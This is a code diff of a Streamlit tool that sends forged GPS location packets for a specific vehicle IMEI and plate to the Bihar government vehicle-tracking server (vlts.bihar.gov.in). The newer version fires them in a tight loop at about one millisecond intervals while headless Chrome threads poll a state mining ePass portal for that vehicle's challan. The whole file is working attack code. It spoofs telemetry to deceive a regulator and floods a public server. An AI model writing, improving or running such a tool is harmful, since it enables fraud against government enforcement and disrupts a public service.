@@ -1,98 +1,105 @@
 import streamlit as st
+import threading
 import socket
 import time
-import pandas as pd
-import random
+from datetime import datetime
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
-st.set_page_config(page_title="Bihar VLTS Master Control", layout="wide")
+# --- Page Config ---
+st.set_page_config(page_title="GATLING NITRO V82", page_icon="🚀", layout="wide")
 
-if 'running' not in st.session_state:
-    st.session_state.running = False
+st.title("🚀 VLTS GATLING NITRO - V82 (WEB)")
+st.markdown("---")
 
-def send_raw(host, port, raw_packet):
-    try:
-        final_to_send = raw_packet + "\r\n"
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        s.settimeout(5)
-        s.connect((host, port))
-        s.sendall(final_to_send.encode('ascii'))
-        time.sleep(0.2) 
-        s.close()
-        return True, "Accepted"
-    except Exception as e:
-        return False, str(e)
+# --- Session State Management ---
+if 'firing' not in st.session_state:
+    st.session_state.firing = False
+if 'total_count' not in st.session_state:
+    st.session_state.total_count = 0
 
-st.title("🛰️ Bihar VLTS Movement Simulator")
-
-# --- EMERGENCY STOP BUTTON ---
-if st.session_state.running:
-    if st.button("🛑 STOP IMMEDIATELY", type="primary", use_container_width=True):
-        st.session_state.running = False
-        st.rerun()
-
-# --- SIDEBAR ---
-st.sidebar.header("⚙️ Server Settings")
-server_host = st.sidebar.text_input("Host IP", "vlts.bihar.gov.in")
-server_port = st.sidebar.number_input("Port", value=9999)
-loop_cnt = st.sidebar.number_input("Total Packets", 1, 5000, 20)
-gap = st.sidebar.slider("Gap (sec)", 0.1, 5.0, 1.0)
-simulate_move = st.sidebar.checkbox("🚀 Simulate Movement (Live Change)", value=True)
-
-# --- INPUTS ---
-c1, c2, c3 = st.columns(3)
-with c1:
+# --- Sidebar Inputs ---
+with st.sidebar:
+    st.header("⚙️ Configuration")
     tag = st.text_input("TAG", "EGAS")
-    imei = st.text_input("IMEI", "860560068639352")
-with c2:
-    veh = st.text_input("Vehicle", "BR29GC1365")
-    base_lat = st.number_input("Starting Latitude", value=25.6489270, format="%.7f")
-    base_lon = st.number_input("Starting Longitude", value=84.7841180, format="%.7f")
-with c3:
-    dt = st.text_input("Date/Time", "04022026,023800")
-    fixed_cs = st.text_input("Checksum", "DDE3")
+    imei = st.text_input("IMEI", "862567075041793")
+    vno = st.text_input("VEHICLE NO", "BR04GA5974")
+    lat = st.text_input("LATITUDE", "25.6501550")
+    lon = st.text_input("LONGITUDE", "84.7851780")
+    
+    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)
+    threads = st.slider("CHROME THREADS", 1, 10, 6)
 
-suffix = "0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
+# --- Logic Functions ---
+def generate_packet():
+    now = datetime.now()
+    d, t = now.strftime("%d%m%Y"), now.strftime("%H%M%S")
+    return f"$PVT,{tag},{imei},{vno},1,{d},{t},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
 
-st.divider()
+def firing_engine():
+    target = ("vlts.bihar.gov.in", 9999)
+    p_bytes = generate_packet().encode('ascii')
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
+    try:
+        if mode == "TCP": sock.connect(target)
+        while st.session_state.firing:
+            sock.sendto(p_bytes, target) if mode == "UDP" else sock.send(p_bytes)
+            st.session_state.total_count += 1
+            time.sleep(0.001)
+    except: pass
+    finally: sock.close()
 
-# --- LIVE STRING PREVIEW BOX ---
-st.subheader("📝 Live Packet String (Server Update)")
-preview_area = st.empty() # Ye box har packet par update hoga
+def scraper_engine():
+    options = Options()
+    options.add_argument("--headless")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+    while st.session_state.firing:
+        try:
+            driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
+            time.sleep(2)
+            driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vno}';")
+            driver.execute_script("__doPostBack('btnSearch','');")
+            time.sleep(5)
+            res = driver.execute_script("""
+                var td = document.evaluate("//td[contains(text(), 'Challan Date')]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
+                return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;
+            """)
+            if res:
+                st.toast(f"📡 Portal Update: {res}")
+                if datetime.now().strftime("%d-%b-%Y").upper() in res.upper():
+                    st.session_state.firing = False
+                    st.success(f"✅ SESSION KILLED! Match: {res}")
+                    break
+        except: pass
+        time.sleep(3)
+    driver.quit()
 
-if not st.session_state.running:
-    # Initial preview
-    init_loc = f"{base_lat:.7f},N,{base_lon:.7f},E"
-    init_str = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{veh},1,{dt},{init_loc},{suffix},{fixed_cs}*"
-    preview_area.text_area("Final Packet:", value=init_str, height=150)
-    if st.button("🚀 START TRANSMISSION", type="secondary", use_container_width=True):
-        st.session_state.running = True
+# --- UI Layout ---
+col1, col2 = st.columns(2)
+
+with col1:
+    if st.button("🔥 START ENGINE", use_container_width=True, disabled=st.session_state.firing):
+        st.session_state.firing = True
+        st.session_state.total_count = 0
+        threading.Thread(target=firing_engine, daemon=True).start()
+        for i in range(threads):
+            threading.Thread(target=scraper_engine, daemon=True).start()
         st.rerun()
 
-# --- EXECUTION ---
-if st.session_state.running:
-    status_area = st.empty()
-    history = []
-    current_lat, current_lon = base_lat, base_lon
+with col2:
+    if st.button("🛑 STOP & RESET", use_container_width=True):
+        st.session_state.firing = False
+        st.session_state.total_count = 0
+        st.rerun()
 
-    for i in range(int(loop_cnt)):
-        if not st.session_state.running: break
-        
-        if simulate_move:
-            # Coordinates ko thoda zyada badla hai taaki dikhe (approx 15-20 meters)
-            current_lat += random.uniform(0.00010, 0.00020)
-            current_lon += random.uniform(0.00010, 0.00020)
-        
-        loc_str = f"{current_lat:.7f},N,{current_lon:.7f},E"
-        final_packet = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{veh},1,{dt},{loc_str},{suffix},{fixed_cs}*"
-        
-        # UI UPDATE: Ab ye box har bar naya location dikhayega
-        preview_area.text_area("Final Packet (Current):", value=final_packet, height=150, key=f"ta_{i}")
-        
-        success, msg = send_raw(server_host, server_port, final_packet)
-        history.insert(0, {"Pkt": i+1, "Location": f"{current_lat:.6f}, {current_lon:.6f}", "Status": "✅" if success else "❌"})
-        status_area.table(pd.DataFrame(history))
-        time.sleep(gap)
-    
-    st.session_state.running = False
+# --- Live Stats ---
+st.metric("Packets Sent", st.session_state.total_count)
+if st.session_state.firing:
+    st.info("🚀 Sync Engine is currently firing and monitoring...")
+    time.sleep(1)
     st.rerun()
